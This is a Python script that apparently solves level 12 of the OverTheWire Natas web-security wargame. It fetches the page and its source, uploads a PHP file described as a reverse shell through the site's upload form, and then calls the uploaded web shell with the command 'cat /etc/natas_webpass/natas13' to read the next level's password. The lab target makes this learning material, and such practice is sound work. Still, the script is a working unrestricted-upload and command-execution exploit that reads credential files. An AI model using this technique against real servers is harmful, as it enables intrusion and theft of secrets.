import requests


k = '(+)'
e = '(-)'
i = '(*)'

userName = 'natas12'
url = f'http://{userName}.natas.labs.overthewire.org/'
fileContent = open('C:\\Users\\niroj\\Documents\\Natas\\password.txt')
password = fileContent.readlines()[11][8:40]
fileContent.close()

# ---------------------------- For frontend html ------------------------------------

response = requests.get(url, auth = (userName, password))
htmlDoc = response.text

# print(htmlDoc)

try:
    with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index.html', 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print(f"{k} the html text is stored at index.html file in .\\temp location.")
except IOError as err :
    print(f"{e} unexpectedly we have {err}")


# --------------------------For index-source.html------------------------------------

response = requests.get(url + 'index-source.html', auth = (userName, password))
htmlDoc = response.text

# print(htmlDoc)

try:
    with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index-source.html', 'w') as htmlSourceContent:
        htmlSourceContent.writelines(htmlDoc)
        print(f"{k} the html text is stored at index-source.html file in .\\temp location.")
except IOError as err :
    print(f"{e} unexpectedly we have {err}")


#--------------------------------- Upload a file ---------------------------------------

data = {
    "filename": "ReSh.php",
}
try:
    with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\phpReverseShell\\ReSh.php', 'rb') as reShContent :
        response = requests.post(url , auth = (userName, password), files={"uploadedfile": reShContent}, data = data)
        finalDoc = response.text
        with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\result.html', 'w') as htmlContent:
            htmlContent.writelines(finalDoc)
            
            # print(finalDoc)
            # 'upload/(_______).php?c=(_________________)
            #-------------^----the value always change according to the source-index.php
            # 'upload/(_______).php?c=(_________________)
            #-------------------------------^------- inject command like 'whoami', 'id' or 'cat /etc/natas_webpass/natas13' etc.

            response = requests.get(url + 'upload/3fnwrg59b4.php?c=cat /etc/natas_webpass/natas13', auth = (userName, password))
            content = response.text
            htmlContent.writelines(content)
            # print(content)
        
        print("(+) Done!")
except IOError as err:
    print(f'(-) unfortunately {err}')
